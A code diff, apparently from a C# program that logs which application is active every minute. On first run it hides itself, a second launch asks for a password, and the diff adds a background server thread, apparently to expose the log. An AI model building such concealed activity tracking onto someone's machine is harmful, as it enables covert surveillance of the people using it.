@@ -20,14 +20,18 @@ namespace SeachActiveApp
         static void Main(string[] args)
         {
 
+
             string strActivApp;
             //string strActivAppOld=null;
             //DateTime dtAppOld;
             DateTime dtActiveApp;
-            
+
+            server www = new server();
+            Thread server = new Thread(www.start);
+            server.Start();
 
             
-            if (isStillRunning())
+            if (isStillRunning()) //Если запустили второй раз то показываем форму ввода пароля
             {
                 System.Diagnostics.Debug.WriteLine("второй раз");
 
@@ -44,7 +48,7 @@ namespace SeachActiveApp
 
 
             }
-            else
+            else //Если запускаем первый раз, то прячемся
             {
                 System.Diagnostics.Debug.WriteLine("первый раз");
 
@@ -64,11 +68,14 @@ namespace SeachActiveApp
 
                     new clRW(dtActiveApp, strActivApp, 1);
 
+                    //new server(80);
+
                     Thread.Sleep(60000); //спим 1 мин
                 }
 
             }
 
+            
         }
 
         static bool isStillRunning()
